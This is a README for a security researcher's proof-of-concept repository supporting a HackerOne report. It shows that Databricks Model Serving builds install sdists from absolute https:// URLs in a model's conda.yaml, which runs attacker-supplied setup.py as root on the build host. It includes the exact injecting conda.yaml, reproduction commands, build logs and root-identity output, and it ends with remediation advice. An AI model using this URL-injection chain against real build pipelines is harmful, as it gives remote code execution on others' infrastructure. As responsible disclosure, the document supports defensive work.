# dbx-build-probe

Verification material for **HackerOne report #4076059** — *Model Serving build pipeline installs
attacker-supplied sdists from absolute URLs: root code execution on Databricks' build infrastructure.*

Everything in this repository was produced on researcher-owned assets: a Databricks Free Edition
workspace, a GitHub account and repository owned by the researcher, and a probe package that is
deliberately benign and read-only. No third-party system, tenant, or credential was touched.

---

## The finding in one line

Databricks Model Serving builds each served model's environment on Databricks build infrastructure.
A pre-build sanitizer constrains the model's `conda.yaml` — package names resolve from the internal
mirror only, local-file requirement lines (`./x.tar.gz`) are stripped, off-mirror version pins are
stripped, and the `channels:` list is regenerated wholesale. **One requirement form passes through
unsanitized: an absolute `https://` URL.**

```yaml
pip:
  - https://github.com/bootmoha639-beep/dbx-build-probe/releases/download/v3/zzbuildprobe-1.2.0.tar.gz
  - mlflow==3.16.1          # normal pins, unchanged
  - numpy==2.5.3
  - pandas==3.0.6
  - scipy==1.18.1
  - statsmodels==0.15.0
```

The build host fetches that tarball, and `setuptools` executes its `setup.py` **as root** inside the
BuildKit sandbox where serving images are built.

## The probe

[`poc/setup.py`](poc/setup.py) is the entire payload — about twenty lines. Before calling `setup()`
it collects, and writes into the package's own `build_evidence.py`:

| collected | source |
|---|---|
| hostname | `socket.gethostname()` |
| kernel | `uname -a` |
| uid / gid | `id` |
| working directory | `os.getcwd()` |
| `~/.cache/pip` and `/tmp` listings | `os.listdir` |
| environment variable **names** | `os.environ.keys()` |

Read-only. No network calls. No environment variable *values*. No writes outside the wheel. The
`build_evidence.py` written at build time ships inside the built wheel, the wheel is installed into
the serving image, and a benign `predict` payload reads it back through the HTTP 200 inference
response.

To build the artifact yourself:

```bash
cd poc && ./build.sh          # -> dist/zzbuildprobe-<version>.tar.gz
```

---

## Files

| File | Produced by | What it shows |
|---|---|---|
| `poc/` | researcher | The complete source of the sdist distributed in each release — this is the code that executes at build time. |
| `BUILD_HOST_PROOF_1790859700.txt` | **the build host**, via a GitHub API `PUT` during the build (commit `3d388bb427a0`) | Attacker-controlled code running on Databricks' build host reached the public internet and wrote to an externally controlled service. |
| `BUILD_HOST_PROOF_1790859691.txt` | **the build host**, via the GitHub API | Earlier capture of the same channel. |
| `DEEPDIVE_SUMMARY_1790860941.json` | **the build host**, via the GitHub API | Deeper probe: `/run/secrets/pip-docker-build-conf` is present in the sandbox (existence only — contents deliberately not read), plus build-tooling layout. |
| `DEEPDIVE_SUMMARY_1790860950.json` | **the build host**, via the GitHub API | Same probe, later run: 92 concurrent `pip-metadata-*` directories in `/tmp`. |
| `BUILD_HOST_ID_OUTPUT.txt` | **the researcher's own workstation** — a local dry run of the probe script, *before* the build | Proof the script works as written. **This is not build-host evidence** (`DESKTOP-RHD2N74`, `uid=197608(PC)`). Included for completeness. |
| `BUILD_LOG_REPRO.txt` | **the build host**, 2026-10-05 | Clean-account reproduction: the build log for `hunt-ep` on `workspace.hunt.hunt_model` v1. |
| `INVOCATION_REPRO.json` | **the serving container**, 2026-10-05 | The HTTP 200 inference response from that endpoint, carrying the build host's `EVIDENCE` back out. |
| `app.py`, `app.yml`, `requirements.txt` | researcher | A separate probe against Databricks **Apps**, from a different report. Unrelated to the Model Serving chain above. |
| `poc/build.sh` | researcher | Reproduces the published sdist. |
| `poc/run_chain.py` | researcher | Drives the whole chain on a workspace you own: logs a model whose `conda.yaml` carries the URL, registers it, deploys an endpoint, invokes it, prints the evidence. |

The release assets (`v1` … `v12`) are the sdist at each stage of the investigation. Each one carries
a placeholder `zzbuildprobe/build_evidence.py` containing the output of a **local dry run** on the
researcher's workstation; that file is unconditionally overwritten by `setup.py` at build time and
has no bearing on the chain.

---

## Reproducing it

On a workspace you own, with a personal access token:

```bash
export DATABRICKS_HOST=https://<your-workspace>.cloud.databricks.com
export DATABRICKS_TOKEN=dapi...

python poc/run_chain.py                 # log -> register -> deploy -> invoke
python poc/run_chain.py --no-deploy     # stop after registering
python poc/run_chain.py --invoke-only   # just invoke whatever is deployed
```

The script creates the schema and experiment if they are missing, prints the pip section
of the registered version's `conda.yaml` so the URL can be confirmed in the registry, and
writes the raw inference response to `INVOCATION_FINAL.json`.

## Reproduced end to end on a clean account

Re-run on 2026-10-05 against a workspace created for the purpose, holding no prior
state — no schema, no experiment, no registered model, no endpoint:

1. `mlflow.statsmodels.log_model(..., conda_env=conda_env(URL))` → registered
   `workspace.hunt.hunt_model` v1, `status=READY`, no gate or warning.
2. Reading the version's `conda.yaml` back **out of the registry** shows the URL on
   line 1 of the pip block, alongside ordinary pins.
3. Deploying it to the endpoint `hunt-ep` ran the image build. Its log
   (`BUILD_LOG_REPRO.txt`) shows the internal mirror in force and the URL passing
   through anyway:

   ```
   #14 0.038   - https://github.com/.../zzbuildprobe-1.2.0.tar.gz
   #14 0.047 Configuring system-wide conda to use local channel only
   #14 0.507 Using local channel file:///package-repo/conda-channel instead of conda-forge
   #14 45.20 Collecting https://github.com/... (from -r /model/condaenv.97hrm4zt.requirements.txt (line 1))
   #14 45.20   Preparing metadata (setup.py): started
   #14 45.20 Building wheel for zzbuildprobe (setup.py): started
   #14 45.20 Successfully installed ... zzbuildprobe-1.2.0
   ```

4. Invoking the endpoint returned HTTP 200 with the build host's identity
   (`INVOCATION_REPRO.json`):

   ```json
   {"predictions": "{\"serving_host\": \"mlflow-server.host.local\",
     \"build_evidence_file\": \"/opt/conda/envs/mlflow-env/lib/python3.12/site-packages/zzbuildprobe/build_evidence.py\",
     \"EVIDENCE\": {\"host\": \"buildkitsandbox\",
       \"uname\": \"Linux buildkitsandbox 6.1.177-224.371.amzn2023.x86_64 ...\",
       \"id\": \"uid=0(root) gid=0(root) groups=0(root)\",
       \"cwd\": \"/tmp/pip-req-build-6k6i874n\", \"home\": \"/root\",
       \"envkeys\": [ ... \"IS_FEATURE_SERVING_CONTAINER\", \"MLFLOW_SERVING_WHEEL\",
                     \"PIP_CONFIG_FILE\", \"USE_PRIVATE_PYTHON_REPO\" ...]}}"}
   ```

   `uid=0(root)` on `buildkitsandbox` was collected by the attacker-supplied `setup.py`
   during the image build, shipped inside the wheel it built, and returned over HTTP by
   the `predict` path reading it back out of `site-packages`.

On a workspace with nothing in it, point `--model` at a catalog you have:

```bash
python poc/run_chain.py --model workspace.hunt.hunt_model
```

## What to look for in the build log

After registering the model and deploying it to a serving endpoint, the build log contains — in order:

```
#14 0.039   - https://github.com/bootmoha639-beep/dbx-build-probe/releases/download/v1/zzbuildprobe-1.0.0.tar.gz
#14 0.049 Configuring system-wide conda to use local channel only
#14 0.533 Using local channel file:///package-repo/conda-channel instead of conda-forge
```
The sanitizer is visible working — channels are regenerated to the internal mirror — while the
absolute-URL requirement line passes through echoed verbatim.

```
#14 45.36 Collecting https://github.com/.../zzbuildprobe-1.0.0.tar.gz (from -r /model/condaenv.h5ybkhja.requirements.txt (line 1))
#14 45.36   Preparing metadata (setup.py): started
#14 45.36   Preparing metadata (setup.py): finished with status 'done'
#14 45.36 Building wheel for zzbuildprobe (setup.py): started
#14 45.36 Building wheel for zzbuildprobe (setup.py): finished with status 'done'
#14 45.36 Successfully installed ... zipp-4.1.0 zzbuildprobe-1.0.0
```

`Preparing metadata (setup.py): started` is the moment the attacker-supplied `setup.py` executes.
`Successfully installed ... zzbuildprobe-1.0.0` is the tarball landing inside the serving image.

## What to look for in the inference response

```json
{"predictions": "{\"serving_host\": \"mlflow-server.host.local\", \"BUILD_EVIDENCE\": {
  \"host\": \"buildkitsandbox\",
  \"uname\": \"Linux buildkitsandbox 6.1.177-224.371.amzn2023.x86_64 ...\",
  \"id\": \"uid=0(root) gid=0(root) groups=0(root)\",
  \"cwd\": \"/tmp/pip-req-build-i4mpvtjt\",
  \"envkeys\": [ \"BUILD_LOG_*_DELIMITER\", \"IS_FEATURE_SERVING_CONTAINER\",
                \"MLFLOW_SERVING_WHEEL\", \"PIP_CONFIG_FILE\", \"USE_PRIVATE_PYTHON_REPO\", ... ]}}"}
```

This data was collected by attacker code executing as root on Databricks' build host during the
image build. It cannot exist otherwise. `USE_PRIVATE_PYTHON_REPO` and `PIP_CONFIG_FILE` are the
platform's own configuration mandating internal-mirror-only — which is why this is a gap in a
control that demonstrably exists, not an intended feature.

---

## Suggested remediation

Strip or reject absolute-URL requirement lines (any pip-section entry beginning with `http://` or
`https://`) the same way `./local` lines and off-mirror pins are stripped. Alternatively, resolve
all requirements through the internal mirror only, and run pip build steps in a non-root,
network-restricted, per-build sandbox with no shared `/tmp`.
